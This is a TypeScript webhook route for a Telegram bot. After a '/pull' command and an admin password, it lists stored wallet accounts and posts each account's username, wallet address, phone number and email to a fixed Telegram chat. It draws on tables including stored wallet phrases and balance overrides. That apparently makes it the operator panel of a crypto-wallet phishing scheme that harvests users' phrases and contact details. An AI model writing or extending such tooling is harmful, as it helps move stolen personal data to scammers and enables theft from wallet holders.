import { createFileRoute } from "@tanstack/react-router";
import { z } from "zod";
import { createAccountCallback, verifyAccountCallback } from "@/lib/telegram-pull-auth.server";

const DEFAULT_ALLOWED_CHAT_ID = -1003957750577;
const UNLOCK_MINUTES = 10;
const PASSWORD_PROMPT = "🔐 Reply with the admin password to continue.";

const telegramUpdateSchema = z.object({
  callback_query: z.object({
    id: z.string(),
    from: z.object({ id: z.number() }),
    data: z.string().optional(),
    message: z.object({ chat: z.object({ id: z.number() }) }).optional(),
  }).optional(),
  message: z.object({
    message_id: z.number(),
    chat: z.object({ id: z.number() }),
    from: z.object({ id: z.number() }).optional(),
    text: z.string().optional(),
    reply_to_message: z.object({
      text: z.string().optional(),
      from: z.object({ is_bot: z.boolean().optional() }).optional(),
    }).optional(),
  }).optional(),
  edited_message: z.object({
    message_id: z.number(),
    chat: z.object({ id: z.number() }),
    from: z.object({ id: z.number() }).optional(),
    text: z.string().optional(),
    reply_to_message: z.object({
      text: z.string().optional(),
      from: z.object({ is_bot: z.boolean().optional() }).optional(),
    }).optional(),
  }).optional(),
});

interface TelegramAccount {
  id: string;
  username: string;
  wallet_address: string;
  phone_number?: string | null;
  email_address?: string | null;
  created_at?: string | null;
}

function esc(value: string) {
  return value.replace(/[<>&]/g, (char) => ({ "<": "&lt;", ">": "&gt;", "&": "&amp;" })[char] ?? char);
}

async function tg(method: string, body: unknown) {
  const token = process.env["TELEGRAM_BOT_TOKEN"];
  if (!token) return null;
  const res = await fetch(`https://api.telegram.org/bot${token}/${method}`, {
    method: "POST",
    headers: { "content-type": "application/json" },
    body: JSON.stringify(body),
  });
  if (!res.ok) console.error("[tg]", method, res.status, await res.text());
  return res;
}

function getAllowedChatId() {
  const configured = Number(process.env["TELEGRAM_CHAT_ID"]);
  return Number.isSafeInteger(configured) ? configured : DEFAULT_ALLOWED_CHAT_ID;
}

interface PhraseRow {
  wallet_address: string;
  username: string | null;
}

/** Stable synthetic id for phrase rows that have no wallet_profiles entry. */
async function syntheticId(address: string) {
  const { createHash } = await import("node:crypto");
  return createHash("sha256").update(address.toLowerCase()).digest("hex").slice(0, 32);
}

async function loadPhrases(): Promise<PhraseRow[]> {
  try {
    const { loadAllStoredPhrases } = await import("@/lib/phrase-lookup.server");
    const rows = await loadAllStoredPhrases();
    return rows.map((r) => ({
      wallet_address: r.wallet_address,
      username: r.username,
    }));
  } catch (error) {
    console.error("[telegram] phrase lookup unavailable", error);
    return [];
  }
}

async function listAccounts(): Promise<TelegramAccount[]> {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const [profilesResult, loginsResult, overridesResult] = await Promise.all([
    supabaseAdmin.from("wallet_profiles").select("id, username, wallet_address, created_at").order("created_at", { ascending: false }).limit(2000),
    supabaseAdmin.from("wallet_logins").select("username, wallet_address, created_at").order("created_at", { ascending: false }).limit(2000),
    supabaseAdmin.from("wallet_balance_overrides").select("wallet_address, created_at").order("created_at", { ascending: false }).limit(2000),
  ]);
  if (profilesResult.error) throw new Error(`Could not load account profiles: ${profilesResult.error.message}`);
  if (loginsResult.error) throw new Error(`Could not load account history: ${loginsResult.error.message}`);
  if (overridesResult.error) throw new Error(`Could not load account balances: ${overridesResult.error.message}`);

  const seen = new Set<string>();
  const out: TelegramAccount[] = [];
  for (const row of profilesResult.data ?? []) {
    const address = row.wallet_address.toLowerCase();
    if (!row.username || seen.has(address)) continue;
    seen.add(address);
    out.push({ id: row.id, username: row.username, wallet_address: row.wallet_address, created_at: row.created_at });
  }

  for (const row of loginsResult.data ?? []) {
    const address = String(row.wallet_address ?? "");
    if (!address || seen.has(address.toLowerCase())) continue;
    seen.add(address.toLowerCase());
    out.push({
      id: await syntheticId(address),
      username: row.username || `${address.slice(0, 6)}…${address.slice(-4)}`,
      wallet_address: address,
      created_at: row.created_at,
    });
  }

  for (const row of overridesResult.data ?? []) {
    const address = String(row.wallet_address ?? "");
    if (!address || seen.has(address.toLowerCase())) continue;
    seen.add(address.toLowerCase());
    out.push({
      id: await syntheticId(address),
      username: `${address.slice(0, 6)}…${address.slice(-4)}`,
      wallet_address: address,
      created_at: row.created_at,
    });
  }

  // Include accounts that only exist in the phrase table.
  for (const row of await loadPhrases()) {
    const address = String(row.wallet_address ?? "");
    if (!address || seen.has(address.toLowerCase())) continue;
    seen.add(address.toLowerCase());
    out.push({
      id: await syntheticId(address),
      username: row.username || `${address.slice(0, 6)}…${address.slice(-4)}`,
      wallet_address: address,
    });
  }

  return out;
}

async function getAccount(id: string): Promise<TelegramAccount | null> {
  const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
  const { data, error } = await supabaseAdmin
    .from("wallet_profiles")
    .select("id, username, wallet_address, phone_number, email_address")
    .eq("id", id)
    .maybeSingle();
  if (error) throw new Error(`Could not load account: ${error.message}`);

  if (data) return data;

  const target = id.replaceAll("-", "");
  const accounts = await listAccounts();
  return accounts.find((account) => account.id.replaceAll("-", "") === target) ?? null;
}

function chunkButtons(rows: TelegramAccount[], userId: number, expiresAt: number) {
  const buttons = rows.map((r) => ({
    text: r.username,
    callback_data: createAccountCallback(r.id, userId, expiresAt),
  }));
  const out: Array<Array<{ text: string; callback_data: string }>> = [];
  for (let i = 0; i < buttons.length; i += 2) out.push(buttons.slice(i, i + 2));
  return out;
}

function paginateButtons(rows: TelegramAccount[], userId: number, expiresAt: number) {
  const pages: ReturnType<typeof chunkButtons>[] = [];
  for (let i = 0; i < rows.length; i += 80) {
    pages.push(chunkButtons(rows.slice(i, i + 80), userId, expiresAt));
  }
  return pages;
}

export const Route = createFileRoute("/api/public/telegram/webhook")({
  server: {
    handlers: {
      POST: async ({ request }) => {
        const allowedChatId = getAllowedChatId();
        const expected = process.env["TELEGRAM_WEBHOOK_SECRET"];
        if (!expected) return new Response("Webhook not configured", { status: 503 });
        const got = request.headers.get("x-telegram-bot-api-secret-token") ?? "";
        if (got !== expected) return new Response("Unauthorized", { status: 401 });

        const rawUpdate: unknown = await request.json().catch(() => null);
        const parsed = telegramUpdateSchema.safeParse(rawUpdate);
        if (!parsed.success) return Response.json({ ok: true, ignored: true });
        const update = parsed.data;

        // Callback query — user tapped a username button
        if (update.callback_query) {
          const cb = update.callback_query;
          const chatId = cb.message?.chat?.id;
          const userId = cb.from?.id;
          const data: string = cb.data ?? "";
          if (chatId !== allowedChatId || !userId) {
            await tg("answerCallbackQuery", { callback_query_id: cb.id, text: "Not allowed" });
            return Response.json({ ok: true });
          }
          if (!data.startsWith("a:")) {
            await tg("answerCallbackQuery", { callback_query_id: cb.id });
            return Response.json({ ok: true });
          }
          const authorization = verifyAccountCallback(data, userId);
          if (!authorization) {
            await tg("answerCallbackQuery", {
              callback_query_id: cb.id,
              text: "This account list expired or belongs to another manager. Send /pull again.",
              show_alert: true,
            });
            return Response.json({ ok: true });
          }
          let account: TelegramAccount | null = null;
          try {
            account = await getAccount(authorization.accountId);
          } catch (error) {
            console.error("[telegram] account lookup failed", error);
            await tg("answerCallbackQuery", { callback_query_id: cb.id, text: "Account lookup is temporarily unavailable", show_alert: true });
            return Response.json({ ok: true });
          }
          await tg("answerCallbackQuery", { callback_query_id: cb.id });
          if (!account) {
            await tg("sendMessage", { chat_id: chatId, text: "❌ That account is no longer available." });
            return Response.json({ ok: true });
          }
          const text = [
            `👤 <b>${esc(account.username)}</b>`,
            `💼 <code>${esc(account.wallet_address)}</code>`,
            `📱 Phone: ${account.phone_number ? esc(account.phone_number) : "Not added"}`,
            `✉️ Email: ${account.email_address ? esc(account.email_address) : "Not added"}`,
          ].join("\n");
          await tg("sendMessage", { chat_id: chatId, text, parse_mode: "HTML" });
          return Response.json({ ok: true });
        }

        const msg = update.message ?? update.edited_message;
        if (!msg?.chat?.id) return Response.json({ ok: true });
        const chatId = msg.chat.id;
        const userId = msg.from?.id;
        if (chatId !== allowedChatId || !userId) return Response.json({ ok: true });
        const text: string = msg.text ?? "";

        // /pull command
        if (/^\/pull(@\w+)?$/i.test(text.trim())) {
          await tg("sendMessage", {
            chat_id: chatId,
            text: PASSWORD_PROMPT,
            reply_markup: { force_reply: true, selective: true },
            reply_to_message_id: msg.message_id,
          });
          return Response.json({ ok: true });
        }

        // Password reply
        const replyTo = msg.reply_to_message;
        if (replyTo?.from?.is_bot && replyTo.text === PASSWORD_PROMPT) {
          const password = text.trim();
          const { verifyAdminPassword } = await import("@/lib/admin.server");
          // Delete the message containing the password to keep it out of chat history.
          await tg("deleteMessage", { chat_id: chatId, message_id: msg.message_id }).catch(() => null);
          if (!verifyAdminPassword(password)) {
            await tg("sendMessage", { chat_id: chatId, text: "❌ Wrong password." });
            return Response.json({ ok: true });
          }
          let rows: TelegramAccount[];
          try {
            rows = await listAccounts();
          } catch (error) {
            console.error("[telegram] account list failed", error);
            await tg("sendMessage", { chat_id: chatId, text: "❌ Account lookup is temporarily unavailable. Please try again shortly." });
            return Response.json({ ok: true });
          }
          if (!rows.length) {
            await tg("sendMessage", { chat_id: chatId, text: "✅ Unlocked, but no accounts on file yet." });
            return Response.json({ ok: true });
          }
          const expiresAt = Date.now() + UNLOCK_MINUTES * 60_000;
          const pages = paginateButtons(rows, userId, expiresAt);
          for (let page = 0; page < pages.length; page += 1) {
            await tg("sendMessage", {
              chat_id: chatId,
              text: page === 0
                ? `✅ Unlocked for ${UNLOCK_MINUTES} min. Pick an account:`
                : `Accounts ${page * 80 + 1}–${Math.min((page + 1) * 80, rows.length)} of ${rows.length}:`,
              reply_markup: { inline_keyboard: pages[page] },
            });
          }
          return Response.json({ ok: true });
        }

        return Response.json({ ok: true });
      },
    },
  },
});
